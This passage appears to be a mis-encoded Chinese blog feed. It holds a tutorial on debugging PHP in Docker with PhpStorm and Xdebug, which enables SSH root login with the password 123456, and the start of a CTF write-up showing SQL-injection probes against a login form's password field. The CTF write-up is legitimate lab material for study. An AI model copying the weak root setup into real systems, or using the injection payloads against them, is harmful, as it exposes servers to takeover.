shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it CONTAINER_IDå€¼ bash</span></span><br><span class="line">root@10b8c28b2f69:/var/www/html# </span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒåŸºæœ¬çš„ Docker ç¯å¢ƒæˆ‘ä»¬å°±å»ºå¥½äº†ã€‚æ¥ä¸‹æ¥ç ”ç©¶ä¸‹å¦‚ä½•è®© PHPSTORM è°ƒè¯• Docker é¡¹ç›®</p><br><h1 id="è°ƒè¯•æ–¹å¼ä¸€-DockeræŒ‚è½½è°ƒè¯•"><a href="#è°ƒè¯•æ–¹å¼ä¸€-DockeræŒ‚è½½è°ƒè¯•" class="headerlink" title="è°ƒè¯•æ–¹å¼ä¸€ - DockeræŒ‚è½½è°ƒè¯•"></a>è°ƒè¯•æ–¹å¼ä¸€ - DockeræŒ‚è½½è°ƒè¯•</h1><p>è¿™é‡Œåšæµ‹è¯•ä½¿ç”¨å‰æ–‡çš„ Dockerfileï¼Œéœ€è¦æŒ‰ç…§å®é™…æƒ…å†µè¿›è¡Œé…ç½®æ·»åŠ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">åŸºç¡€ image ä¸º php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"><span class="meta">#</span><span class="bash">å®‰è£… xdebug æ‰©å±• å¹¶å¼€å¯</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash"> !!! ä½¿ç”¨ä¸€ä¸ªå¯åŠ¨è„šæœ¬æ¥å¯åŠ¨æœåŠ¡ !!!</span></span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure><p>start.sh å†…å®¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">é…ç½® Xdebug</span></span><br><span class="line">echo &quot;xdebug.client_host = host.docker.internal&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.client_port = 9003&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.mode = debug&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.max_nesting_level = 1000&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.discover_client_host = true&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="meta">#</span><span class="bash">é‡å¯ apache ssh</span></span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure><p>é‡å»º imageï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">æœ€å¥½å…ˆåˆ æ‰ä¹‹å‰çš„å†é‡å»º</span></span><br><span class="line">docker image rm IMAGEå€¼ -f</span><br><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>é‡å»ºå®Œå…ˆä¸æ€¥ç€è·‘ containerã€‚å…ˆå®šä½åˆ°æˆ‘ä»¬çš„é¡¹ç›®ä»£ç ä½ç½®</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/15.png" width="500px"><p>ä½¿ç”¨ Docker çš„ <em>Bind mounts</em> æŠ€æœ¯ã€‚å°†å®¿ä¸»æœºçš„é¡¹ç›®ç›®å½•æ˜ å°„åˆ° container çš„ç½‘ç«™ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 --mount type=bind,source=/home/xp/test_docker/test_program,target=/var/www/html test/testmyphp</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œè°ƒè¯•ç¯å¢ƒæ‰€éœ€è¦çš„æœåŠ¡å°±å®‰è£…å¥½äº†ï¼Œæ¥ä¸‹æ¥é…ç½® PHPSTORMã€‚</p><br><h2 id="é…ç½®-PHPSTORM"><a href="#é…ç½®-PHPSTORM" class="headerlink" title="é…ç½® PHPSTORM"></a>é…ç½® PHPSTORM</h2><p>ç›´æ¥ä½¿ç”¨ <code>Open</code> æ‰“å¼€é¡¹ç›®</p><br><p><strong>é…ç½® ç›®å½•æ˜ å°„</strong></p><p>è¿›å…¥ <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers</em>ã€‚é…ç½®ç›®å½•æ˜ å°„</p><p>æ³¨æ„ä¸€å®šè¦æŠŠ <em>Use path mappings</em> çš„å‹¾å‹¾ä¸Šï¼Œæ‰èƒ½é…ç½®ç›®å½•æ˜ å°„</p><p><em>Absolute path on the server</em>  æ˜¯è¦æ‰‹åŠ¨æ‰“ä¸ŠæœåŠ¡å™¨è·¯å¾„çš„</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/8.png" width="800px"><p><strong>è®¾ç½®Xdebugç«¯å£</strong></p><p>è¿›å…¥ <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em> -&gt; Debugã€‚è®¾ç½® <em>Xdebug Debug port</em> ä¸º 9003ã€‚å’Œ php é…ç½®ä¸€è‡´ã€‚</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/9.png" width="800px"><p><strong>é…ç½®ä¸€ä¸ª Run/Debug Configuration</strong></p><p>ç‚¹å‡» PHPSTORM å³ä¸Šè§’çš„ *Add Configurationâ€¦.*ã€‚è¿›å…¥é…ç½®é¢ï¼Œæ–°å¢ä¸€ä¸ª PHP Web Pageã€‚å¹¶è¿›è¡Œå¦‚ä¸‹ç®€å•çš„é…ç½®å³å¯ï¼ˆæ”¹åå­—è®¾url è·¯å¾„ï¼‰</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/10.png" width="900px"><p><strong>å¯åŠ¨ PHP Debug Listening</strong></p><p>ç›´æ¥ç‚¹å‡» PHPSTROM å³ä¸Šè§’çš„ <em>å°ç”µè¯</em> ï¼Œå³å¯å¼€å¯ç›‘å¬</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/11.png" width="500px"><p><strong>éªŒè¯</strong></p><p>åœ¨ phpæ–‡ä»¶ä¸Šæ‰“ä¸Šæ–­ç‚¹ï¼Œç‚¹å‡» å³ä¸Šè§’ ç”²å£³è™«æ ·å¼çš„ DebugæŒ‰é’®ã€‚å³å¯æˆåŠŸæ–­ç‚¹</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/12.png" width="500px"><br><h1 id="è°ƒè¯•æ–¹å¼äºŒ-ssh-éš§é“"><a href="#è°ƒè¯•æ–¹å¼äºŒ-ssh-éš§é“" class="headerlink" title="è°ƒè¯•æ–¹å¼äºŒ - ssh éš§é“"></a>è°ƒè¯•æ–¹å¼äºŒ - ssh éš§é“</h1><p>è¿™ç§æ–¹å¼ä¸ä»…ä»…å¯ä»¥ç”¨åœ¨ <strong>Docker ç¯å¢ƒ</strong> ä¸Šï¼ŒåŒæ ·å¯ä»¥ç”¨åœ¨ <strong>è¿œç¨‹æœåŠ¡å™¨</strong> ä¸Šã€‚ç¼ºç‚¹å°±æ˜¯è¦åœ¨ container é‡Œå¤´å®‰è£…è®¸å¤šé¢å¤–æœåŠ¡ã€‚</p><br><h2 id="é…ç½®Dockerfile"><a href="#é…ç½®Dockerfile" class="headerlink" title="é…ç½®Dockerfile"></a>é…ç½®Dockerfile</h2><ol><li>å®‰è£…sshæœåŠ¡ã€‚ PHPSTORMéœ€è¦ ssh æ¥è¿›è¡Œç›®å½•æ˜ å°„ï¼Œä¸ç„¶æ— æ³•æˆåŠŸ Debug</li><li>å®‰è£… xdebugã€‚è¿™æ˜¯è°ƒè¯•çš„åŸºç¡€æ‰©å±•ç»„ä»¶</li><li>è®¾ç½® ssh å…è®¸ root ç™»é™†ã€‚æ¯•ç«Ÿåªæ˜¯ä¸ª docker è°ƒè¯•ç¯å¢ƒï¼Œå°±ä¸å¼„é‚£ä¹ˆéº»çƒ¦äº†ã€‚å½“ç„¶å¦‚æœæ˜¯çº¿ä¸Šä¸šåŠ¡å•¥çš„å½“ç„¶è¦åšå¥½æƒé™åˆ†é…ã€‚</li><li>ä¿®æ”¹ rootå¯†ç ã€‚æ¯•ç«Ÿä¸çŸ¥é“å¯†ç ä¹Ÿæ— æ³•è¿æ¥</li><li>å¯åŠ¨ ssh æœåŠ¡</li><li>é‡å¯ apache æœåŠ¡</li></ol><p>è¿™é‡Œåšæµ‹è¯•ä½¿ç”¨å‰æ–‡çš„ Dockerfileï¼Œéœ€è¦æŒ‰ç…§å®é™…æƒ…å†µè¿›è¡Œé…ç½®æ·»åŠ ã€‚</p><p>ä¿®æ”¹å‰æ–‡çš„ Dockerfileã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">åŸºç¡€ image ä¸º php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"></span><br><span class="line">ENV APACHE_DOCUMENT_ROOT /var/www/html</span><br><span class="line"><span class="meta">#</span><span class="bash">å®‰è£… ssh æœåŠ¡</span></span><br><span class="line">RUN apt-get update &amp;&amp; \</span><br><span class="line">apt-get install ssh -y</span><br><span class="line"><span class="meta">#</span><span class="bash">å®‰è£… xdebug æ‰©å±• å¹¶å¼€å¯</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash">å°†å®¿ä¸»æœºçš„ phpinfo.php æ‹·è´åˆ° container /var/www/html/phpinfo.php ä¸­</span></span><br><span class="line">COPY ./phpinfo.php /var/www/html/phpinfo.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> !!! ä½¿ç”¨ä¸€ä¸ªå¯åŠ¨è„šæœ¬æ¥å®Œæˆæµç¨‹ 3 4 5 çš„å·¥ä½œ !!!</span></span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure><p>start.sh å†…å®¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">è®¾ç½® ssh å…è®¸ root ç™»å½•</span></span><br><span class="line">echo &#x27;PermitRootLogin yes&#x27; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="bash">ä¿®æ”¹rootå¯†ç </span></span><br><span class="line">echo root:123456 | chpasswd</span><br><span class="line"><span class="meta">#</span><span class="bash">é…ç½® Xdebugã€‚Xdebug 3 çš„é…ç½®å¦‚ä¸‹ï¼Œå’Œ Xdebug 2ä¸å¤ªä¸€æ ·</span></span><br><span class="line">echo &quot;xdebug.client_host = host.docker.internal&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.client_port = 9003&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.mode = debug&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.max_nesting_level = 1000&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.discover_client_host = true&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="meta">#</span><span class="bash">é‡å¯ apache ssh</span></span><br><span class="line">service apache2 restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="meta">#</span><span class="bash">è¦åŠ ä¸Šè¿™ä¸ªï¼Œä¸ç„¶ container è¿è¡Œå®Œå°±åœæ­¢äº†ã€‚</span></span><br><span class="line">sleep infinity</span><br></pre></td></tr></table></figure><p>é‡å»º imageï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">æœ€å¥½å…ˆåˆ æ‰ä¹‹å‰çš„å†é‡å»º</span></span><br><span class="line">docker image rm IMAGEå€¼ -f</span><br><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ containerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 -p 2222:22 test/testmyphp</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œè°ƒè¯•ç¯å¢ƒæ‰€éœ€è¦çš„æœåŠ¡å°±å®‰è£…å¥½äº†ï¼Œæ¥ä¸‹æ¥é…ç½® PHPSTORMã€‚</p><br><h2 id="é…ç½®-PHPSTORM-1"><a href="#é…ç½®-PHPSTORM-1" class="headerlink" title="é…ç½® PHPSTORM"></a>é…ç½® PHPSTORM</h2><p>æ‰“å¼€ PHPSTORMï¼Œæ–°å»ºä¸€ä¸ª Projectã€‚é€‰æ‹© <em>New Project from Existing Files</em></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/1.png" width="500px"><p>é€‰æ‹© <em>Web server is on remote host</em>ã€‚</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/2.png" width="500px"><p>ä¸€è·¯ <em>Next</em>ã€‚èµ°åˆ°é…ç½® <em>Remote Server</em></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/3.png" width="500px"><p>ç„¶ååˆæ˜¯ä¸€è·¯ <em>Next</em> å³å¯ã€‚</p><p>é…ç½®å®Œæˆåï¼Œå°†èƒ½çœ‹åˆ°æˆ‘ä»¬çš„é¡¹ç›®ã€‚</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/4.png" width="500px"><p>æ­¤æ—¶æ˜¯ä¸èƒ½ç›´æ¥è¿›è¡Œä»£ç è°ƒè¯•çš„ã€‚æˆ‘ä»¬è¦åšä»¥ä¸‹å·¥ä½œ</p><ol><li>é…ç½® CLI Interpreter</li><li>é…ç½®ç›®å½•æ˜ å°„</li><li>è®¾ç½®Xdebugç«¯å£</li><li>é…ç½®ä¸€ä¸ª Run/Debug Configuration</li><li>å¯åŠ¨ PHP Debug Listening</li></ol><p><em>psï¼šç”±äºæœ‰äº›æ­¥éª¤æ˜¯ä¸€æ ·çš„ï¼Œå°±ç›´æ¥æ‹‰ä¸Šæ–‡çš„æˆªå›¾è¿‡æ¥äº†ã€‚</em></p><p><strong>é…ç½® CLI Interpreter</strong></p><p>è¿›å…¥ <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em>ã€‚è®¾ç½® CLI Interpreter</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/5.png" width="500px"><p>æ–°å»ºä¸€ä¸ª <em>CLI Interpreter</em>ã€‚é€‰æ‹© <em>From Docker, Vagrant, VM, WSL,Remoteâ€¦.</em></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¡« SSHï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€‰æ‹© Dockerã€‚æˆ‘è¿™é‡Œç”¨çš„æ˜¯ SSH</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/6.png" width="500px"><p>è®¾ç½® PHP executable è·¯å¾„ã€‚ä¸çŸ¥é“å¯ä»¥è¿›å…¥ container ä¸­ä½¿ç”¨ <code>whereis php</code> è¿›è¡Œæœç´¢</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/7.png" width="500px"><p><strong>é…ç½® ç›®å½•æ˜ å°„</strong></p><p>è¿›å…¥ <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers</em>ã€‚é…ç½®ç›®å½•æ˜ å°„</p><p>æ³¨æ„ä¸€å®šè¦æŠŠ <em>Use path mappings</em> çš„å‹¾å‹¾ä¸Šï¼Œæ‰èƒ½é…ç½®ç›®å½•æ˜ å°„</p><p><em>Absolute path on the server</em>  æ˜¯è¦æ‰‹åŠ¨æ‰“ä¸ŠæœåŠ¡å™¨è·¯å¾„çš„</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/8.png" width="500px"><p><strong>è®¾ç½®Xdebugç«¯å£</strong></p><p>è¿›å…¥ <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em> -&gt; Debugã€‚è®¾ç½® <em>Xdebug Debug port</em> ä¸º 9003ã€‚å’Œ php é…ç½®ä¸€è‡´ã€‚</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/9.png" width="500px"><p><strong>é…ç½®ä¸€ä¸ª Run/Debug Configuration</strong></p><p>ç‚¹å‡» PHPSTORM å³ä¸Šè§’çš„ *Add Configurationâ€¦.*ã€‚è¿›å…¥é…ç½®é¢ï¼Œæ–°å¢ä¸€ä¸ª PHP Web Pageã€‚å¹¶è¿›è¡Œå¦‚ä¸‹ç®€å•çš„é…ç½®å³å¯ï¼ˆæ”¹åå­—è®¾url è·¯å¾„ï¼‰</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/10.png" width="500px"><p><strong>å¯åŠ¨ PHP Debug Listening</strong></p><p>ç›´æ¥ç‚¹å‡» PHPSTROM å³ä¸Šè§’çš„ <em>å°ç”µè¯</em> ï¼Œå³å¯å¼€å¯ç›‘å¬</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/11.png" width="500px"><p><strong>éªŒè¯</strong></p><p>åœ¨ phpæ–‡ä»¶ä¸Šæ‰“ä¸Šæ–­ç‚¹ï¼Œç‚¹å‡» å³ä¸Šè§’ ç”²å£³è™«æ ·å¼çš„ DebugæŒ‰é’®ã€‚å³å¯æˆåŠŸæ–­ç‚¹</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/12.png" width="500px"><p><strong>æ‰©å±• - è¿œç¨‹æœåŠ¡å™¨è°ƒè¯•</strong></p><p>è¿™é‡Œå¯ä»¥æ‰©å±•ä»¥ä¸€ä¸‹ï¼Œå¦‚æœè°ƒè¯•ç›®æ ‡æ˜¯è¿œç¨‹æœåŠ¡å™¨è€Œä¸æ˜¯æœ¬åœ° Dockerï¼Œè¯¥å¦‚ä½•é…ç½®ï¼Ÿ</p><p>å…¶å®å’Œä¸Šé¢çš„æ­¥éª¤ä¸€æ ·çš„ï¼Œåªæ˜¯ Xdebug ç›‘å¬çš„æµé‡æˆ‘ä»¬è¦åšä¿®æ”¹ä¸‹ã€‚</p><p><strong>ç®€å•è¯´è¯´ Xdebug ç›‘å¬çš„åŸç†ï¼š</strong></p><p>å½“ php-xdebug æ¥æ”¶åˆ°å¸¦æœ‰ XDEBUG_SESSION_START çš„è¯·æ±‚æ—¶ï¼Œå°†ä¼šæŠŠå½“å‰çš„ Debugä¿¡ æ¯å‘é€ç»™ xdebug ä¸­é…ç½®çš„ client_host å’Œ cilent_portã€‚</p><p>åœ¨æˆ‘ä»¬çš„ start.sh å¯åŠ¨æ–‡ä»¶ä¸­ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.client_host = host.docker.internal</span><br><span class="line">xdebug.client_port = 9003</span><br></pre></td></tr></table></figure><p><code>host.docker.internal</code> å€¼åœ¨ Xdebug ä¸­æ˜¯è‡ªåŠ¨å°†è¯·æ±‚ç«¯çš„ ip è®¾ç½®ä¸º è°ƒè¯•ç«¯ï¼Œå³è‡ªåŠ¨å°† Debugä¿¡æ¯ å‘é€ç»™ä»»ä½•è¯·æ±‚IPã€‚</p><p>è€Œ <code>xdebug.client_port</code> çš„å€¼æ˜¯ Debugä¿¡æ¯ è¢«å‘é€è‡³çš„ç«¯å£ã€‚</p><br><p>æˆ‘ä»¬å¯ä»¥æƒ³ä¸‹ï¼Œåœ¨æœ¬åœ°ï¼Œxdebugç«¯æ˜¯èƒ½è®¿é—®åˆ°åˆ°æˆ‘ä»¬è¯·æ±‚ç«¯çš„ ip å’Œ ç«¯å£ çš„ï¼Œå› ä¸ºéƒ½æ˜¯åŒä¸€å±€åŸŸç½‘ã€‚</p><p>ä½†è‹¥è°ƒè¯•çš„æ˜¯è¿œç¨‹æœåŠ¡å™¨ï¼Œç”±äºå…¬ç½‘å’Œå†…ç½‘çš„åŸå› ï¼Œå…¬ç½‘æœåŠ¡å™¨æ˜¯æ— æ³•å‘é€ Debugä¿¡æ¯ è°ƒè¯•ç«¯çš„ï¼ˆé™¤éè°ƒè¯•ç«¯ä¹Ÿåœ¨å…¬ç½‘ä¸Šã€‚ã€‚ï¼‰</p><br><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† <code>xdebug.client_host</code> è®¾ç½®ä¸º <code>127.0.0.1</code>ï¼Œè®© xdebug è½¬å‘ Debugä¿¡æ¯ åˆ°æœ¬åœ°çš„ 9003 ç«¯å£ä¸­ã€‚</p><p>æ¥ç€ä½¿ç”¨ ssh éš§é“è¿›è¡Œç«¯å£è½¬å‘ï¼ŒæŠŠè°ƒè¯•ç«¯ç›‘å¬çš„ 9003 ç«¯å£æ˜ å°„åˆ° æœåŠ¡ç«¯çš„ 9003 ä¸Šã€‚è¿™æ ·å°±èƒ½æ¥æ”¶åˆ° xdebug è½¬å‘çš„ Debugä¿¡æ¯äº†ã€‚è¿™ä¸€ç‚¹ä½¿ç”¨ ssh éš§é“æ˜¯å¯ä»¥åšåˆ°çš„ã€‚</p><br><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸‹ï¼Œé¦–å…ˆä¿®æ”¹ php.iniã€‚è®© <code>xdebug.client_host</code> å€¼ä¸º <code>127.0.0.1</code></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/13.png" width="500px"><p>è¿›è¡Œ sshéš§é“ç«¯å£è½¬å‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -R è¿œç¨‹IP:è¿œç¨‹ç«¯å£:127.0.0.1:9003 root@è¿œç¨‹IP</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ä½¿ç”¨è°ƒè¯•è¿œç¨‹ç¨‹åºäº†ã€‚</p><br><h1 id="Referenceï¼š"><a href="#Referenceï¼š" class="headerlink" title="Referenceï¼š"></a>Referenceï¼š</h1><p><a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></p><p><a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡é¦–å‘åœ¨ Freebufã€‚ä½†å¥½åƒæ’ç‰ˆæ²¡é‚£ä¹ˆå¥½çœ‹ 233.ã€‚ã€‚ã€‚äºæ˜¯æƒ³åšå®¢ä¹Ÿå‘ä¸€ä»½å¯¹ç…§çœ‹çœ‹ï¼Œä¸ªäººæ„Ÿè§‰è¿˜æ˜¯æˆ‘è¿™é‡Œçš„æ’ç‰ˆå¥½çœ‹ç‚¹å“ˆå“ˆå“ˆ&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="http://example.com/categories/Docker/"/>
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CTFç©è€ç³»åˆ—[2] - [VNCTF2021] WEB realezjvav &amp;&amp; Ez_game</title>
    <link href="http://example.com/2021/03/15/2021-03-14-VNCTF2021-log/"/>
    <id>http://example.com/2021/03/15/2021-03-14-VNCTF2021-log/</id>
    <published>2021-03-15T02:01:08.000Z</published>
    <updated>2021-03-24T14:50:55.983Z</updated>
    
    <content type="html"><![CDATA[<p>ç®€å•è®°å½•ä¸‹ç¬¬äºŒæ¬¡å‚åŠ CTFã€‚ã€‚è™½ç„¶è¿˜æ˜¯åšä¸å‡ºæ¥é¢˜ã€‚ã€‚ã€‚</p><p>è¿™ç¯‡æ–‡ç« ä¸»è¦å°±æ˜¯æƒ³åˆ†äº«ä¸‹ Mysql if çš„ä¸€ä¸ªå°æŠ€å·§ã€‚å¢åŠ ä¸€ä¸ªå¸ƒå°”æ³¨å…¥çš„å°å§¿åŠ¿ã€‚</p><span id="more"></span><br><h1 id="Web-realezjvav"><a href="#Web-realezjvav" class="headerlink" title="Web - realezjvav"></a>Web - realezjvav</h1><p>æœ¬æ¥çœ‹åˆ° java æ²¡æ‰“ç®—çœ‹çš„ï¼Œå¯æ˜¯å‡ºé¢˜äººè¯´è¿™ä¸ªå¹¶æ²¡æœ‰è€ƒåˆ°å¤šå°‘ java çŸ¥è¯†ã€‚ä¾¿å»ç„äº†ä¸‹ã€‚æ­¤é¢˜éœ€è¦ä¸¤æ­¥æ‰èƒ½å¾—è§£ã€‚æˆ‘åªåšå‡ºäº†ç¬¬ä¸€æ­¥ã€‚ã€‚ã€‚ç¬¬ä¸€æ­¥æ˜¯ SQLå¸ƒå°”æ³¨å…¥ï¼Œç¬¬äºŒæ­¥è™½ç„¶æ²¡åšå‡ºæ¥ï¼Œä½†æ˜¯ä¼°è®¡æ˜¯ fastjson çš„ RCE</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/1.png" style="width:500px;"><p>é€šè¿‡æµ‹è¯•å¾—çŸ¥ï¼Œ<code>password</code> å­˜åœ¨ SQL æ³¨å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=123456&#x27;</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br></pre></td></tr></table></figure><br><p>åœ¨ç»è¿‡ä¸€ç•ªå°è¯•ï¼Œå‘ç°å½“å­—æ®µä¸­å­˜åœ¨ <code>union</code> æˆ–è€… <code>sleep</code> æ—¶ï¼Œä¼šå°†æ•´ä¸ª <code>password</code> çš„å€¼æ¸…ç©ºå†å¸¦å…¥åˆ° SQLè¯­å¥ä¸­ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; union select#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line">[æ ¹æ®å‰åå“åº”ï¼Œåˆ¤æ–­æ­¤æ—¶çš„ SQL è¯­å¥åœ¨æ‰§è¡Œæ˜¯åº”è¯¥æ˜¯:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; select#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line">[æ ¹æ®å‰åå“åº”ï¼Œåˆ¤æ–­æ­¤æ—¶çš„ SQL è¯­å¥åœ¨æ‰§è¡Œæ˜¯åº”è¯¥æ˜¯:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27; select#&#x27;</span><br><span 